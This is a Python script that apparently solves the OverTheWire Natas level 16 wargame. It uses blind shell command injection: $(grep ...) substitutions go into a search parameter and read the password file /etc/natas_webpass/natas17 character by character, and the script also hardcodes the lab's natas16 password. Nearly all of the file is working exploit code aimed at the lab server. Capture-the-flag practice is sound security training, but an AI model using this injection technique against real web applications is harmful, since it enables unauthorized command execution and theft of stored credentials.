#!/usr/bin/ python

import time
import string
import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures

start_script = time.perf_counter()
all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
natas16_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
natas17_password = ""
filtered_chars = ""

def get_chars(char):
    req = requests.post('http://natas16.natas.labs.overthewire.org/index.php?needle=sonatas$(grep ' + char + ' /etc/natas_webpass/natas17)',
            auth=HTTPBasicAuth('natas16', natas16_password) )

    if 'sonatas' not in req.text:
        return char
    else:
        return None

start_filter = time.perf_counter()

with concurrent.futures.ThreadPoolExecutor() as executor:
    result = executor.map(get_chars, all_chars)

    for r in result:
        if r is not None:
            print(r, end='', flush=True)
            filtered_chars = filtered_chars + str(r)

end_filter = time.perf_counter()
print(f'\nFiltering characters completed in {round(end_filter - start_filter, 2)} seconds')

def get_password(fc):
    req = requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=sonatas$(grep ^' + natas17_password + str(fc) + ' /etc/natas_webpass/natas17)', auth=HTTPBasicAuth('natas16', natas16_password))

    if 'sonatas' not in req.text:
        return str(fc)
    else:
        return None

start_password = time.perf_counter()

for _ in range(0,32):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        result = executor.map(get_password, filtered_chars)

        for r in result:
            if r is not None:
                natas17_password = natas17_password + str(r)
                print(r, end='', flush=True)

end_password = time.perf_counter()

print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')

end_script = time.perf_counter()

print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
